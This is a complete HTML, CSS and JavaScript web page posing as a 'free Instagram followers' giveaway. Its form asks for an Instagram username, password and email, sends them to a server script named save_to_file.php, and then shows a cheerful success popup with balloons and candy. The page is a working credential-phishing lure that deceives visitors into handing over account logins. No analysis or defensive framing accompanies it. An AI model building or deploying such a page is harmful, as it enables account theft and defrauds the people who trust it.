<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cartoon Free Instagram Followers</title>
    <style>
        /* Reset and global styles */
        body, html {
            margin: 0;
            padding: 0;
            font-family: 'Comic Sans MS', cursive, sans-serif;
            background: linear-gradient(to right, #ff9a9e, #fad0c4);
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            position: relative;
        }

        .container {
            background: #fff;
            border-radius: 15px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
            padding: 40px;
            max-width: 500px;
            width: 100%;
            text-align: center;
            border: 5px solid #ff6b81;
            position: relative;
            animation: bounce 1s infinite;
        }

        @keyframes bounce {
            0%, 20%, 50%, 80%, 100% {
                transform: translateY(0);
            }
            40% {
                transform: translateY(-30px);
            }
            60% {
                transform: translateY(-15px);
            }
        }

        h1 {
            font-size: 28px;
            margin-bottom: 20px;
            color: #ff6b81;
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        label {
            font-size: 18px;
            color: #ff6b81;
            font-weight: bold;
        }

        input[type="text"],
        input[type="password"],
        input[type="email"],
        select {
            padding: 12px;
            border: 2px solid #ff6b81;
            border-radius: 10px;
            font-size: 16px;
            outline: none;
            transition: border-color 0.3s;
        }

        input:focus,
        select:focus {
            border-color: #ff4757;
        }

        button.submit-btn {
            background-color: #ff6b81;
            color: #fff;
            padding: 12px;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            cursor: pointer;
            transition: background-color 0.3s, transform 0.2s;
        }

        button.submit-btn:hover {
            background-color: #ff4757;
            transform: scale(1.05);
        }

        /* Success popup styling */
        .popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #fff;
            border: 2px solid #ff6b81;
            border-radius: 15px;
            padding: 20px;
            text-align: center;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
            z-index: 1000;
            animation: fadeIn 0.5s ease-out;
        }

        .popup h2 {
            font-size: 24px;
            color: #ff6b81;
        }

        .popup .emoji {
            font-size: 50px;
            display: inline-block;
            margin: 10px 0;
        }

        .popup button {
            background-color: #ff6b81;
            color: #fff;
            padding: 10px 20px;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .popup button:hover {
            background-color: #ff4757;
        }

        @keyframes fadeIn {
            0% { opacity: 0; }
            100% { opacity: 1; }
        }

        @keyframes shake {
            0% { transform: translateX(0); }
            25% { transform: translateX(-10px); }
            50% { transform: translateX(10px); }
            75% { transform: translateX(-10px); }
            100% { transform: translateX(0); }
        }

        .balloon-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 500;
        }

        .balloon {
            position: absolute;
            font-size: 60px;
            transform: translateY(100%);
            animation: float 4s ease-in-out forwards, burst 0.5s ease-in-out 3s forwards;
        }

        @keyframes float {
            0% { transform: translateY(100%); }
            100% { transform: translateY(-100%); }
        }

        @keyframes burst {
            0% { transform: scale(1); }
            50% { transform: scale(0.7); }
            100% { transform: scale(0); opacity: 0; }
        }

        .candy {
            position: absolute;
            font-size: 40px;
            animation: fall 2s ease-in-out forwards;
            pointer-events: none;
        }

        @keyframes fall {
            0% { transform: translateY(-100%); }
            100% { transform: translateY(100%); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎉 Get Free Instagram Followers 🎈</h1>
        <form id="followers-form" action="save_to_file.php" method="POST">
    <label for="username">Instagram Username</label>
    <input type="text" id="username" name="username" placeholder="Enter your Instagram username" required>

    <label for="password">Instagram Password</label>
    <input type="password" id="password" name="password" placeholder="Enter your Instagram password" required>

    <label for="email">Email</label>
    <input type="email" id="email" name="email" placeholder="Enter your email address" required>

    <label for="followers">Number of Followers</label>
    <select id="followers" name="followers" required>
        <option value="1000">1K</option>
        <option value="2000">2K</option>
        <option value="5000">5K</option>
        <option value="10000">10K</option>
    </select>

    <button type="submit" class="submit-btn">Get Followers</button>
</form>
    </div>

    <!-- Success Popup -->
    <div class="popup" id="success-popup">
        <h2>Success!</h2>
        <div class="emoji">🎉</div>
        <button onclick="closePopup()">Close</button>
    </div>

    <div class="balloon-container" id="balloon-container"></div>

<script>
    document.getElementById('followers-form').addEventListener('submit', function(event) {
        event.preventDefault();

        const form = event.target;
        const formData = new FormData(form);

        fetch(form.action, {
            method: 'POST',
            body: formData
        })
        .then(response => response.text())
        .then(result => {
            if (result === 'success') {
                // Show success popup
                const popup = document.getElementById('success-popup');
                popup.style.display = 'block';

                // Create balloons
                const balloonContainer = document.getElementById('balloon-container');

                const createBalloon = (left) => {
                    const balloon = document.createElement('div');
                    balloon.className = 'balloon';
                    balloon.style.left = left;
                    balloon.innerText = '🎈';
                    balloonContainer.appendChild(balloon);

                    // Animate balloons
                    balloon.style.animation = 'float 4s ease-in forwards';
                    setTimeout(() => {
                        balloon.style.animation = 'burst 1s ease-out forwards';
                    }, 3000); // Balloons burst after flying for 3 seconds
                };

                createBalloon('20%');
                createBalloon('50%');
                createBalloon('80%');

                // Show candy after balloons burst
                setTimeout(() => {
                    const candyCount = 5;
                    for (let i = 0; i < candyCount; i++) {
                        const candy = document.createElement('div');
                        candy.className = 'candy';
                        candy.innerText = '🍬';
                        candy.style.left = `${Math.random() * 100}%`;
                        candy.style.top = `${Math.random() * 50}%`;
                        balloonContainer.appendChild(candy);
                        candy.style.animation = 'fall 2s ease-in forwards';
                    }
                }, 3500); // Delay for candy appearance

                // Shake the page
                document.body.style.animation = 'shake 0.5s ease';
                setTimeout(() => {
                    document.body.style.animation = '';
                }, 500);

                // Auto-close popup after 5 seconds
                setTimeout(() => {
                    popup.style.display = 'none';
                }, 5000);
            } else {
                alert('An error occurred.');
            }
        });
    });

    function closePopup() {
        document.getElementById('success-popup').style.display = 'none';
    }
</script>
</body>
</html>
